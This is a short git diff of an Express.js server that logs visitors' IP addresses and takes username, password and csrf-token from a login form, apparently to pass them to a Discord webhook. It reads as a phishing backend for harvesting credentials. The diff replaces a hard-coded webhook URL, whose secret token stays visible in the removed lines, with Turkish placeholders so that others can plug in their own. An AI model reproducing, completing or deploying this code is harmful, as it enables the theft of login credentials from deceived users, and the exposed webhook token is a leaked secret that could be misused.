@@ -9,7 +9,7 @@ app.use(express.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
 app.get('/', async (req, res) => {
-  const webhookUrl = "https://discord.com/api/webhooks/1345361213168549888/_DRIq7DtJj-zEolMp0iidSMhrqV5tc96DinF2Bfc2hSwo5JOi__aTCrsl98OEHFMyViW";
+  const webhookUrl = "Webhook Linkiniz";
   const userIP = req.ip;
 
   const data = {
@@ -51,7 +51,7 @@ app.get('/', async (req, res) => {
 });
 
 app.post('/api', async (req, res) => {
-  const webhookUrl = "https://discord.com/api/webhooks/1345361213168549888/_DRIq7DtJj-zEolMp0iidSMhrqV5tc96DinF2Bfc2hSwo5JOi__aTCrsl98OEHFMyViW";
+  const webhookUrl = "Webhook Koyun";
   const { username = 'N/A', password = 'N/A', 'csrf-token': csrfToken = 'N/A' } = req.body;
   const userIP = req.ip;
 
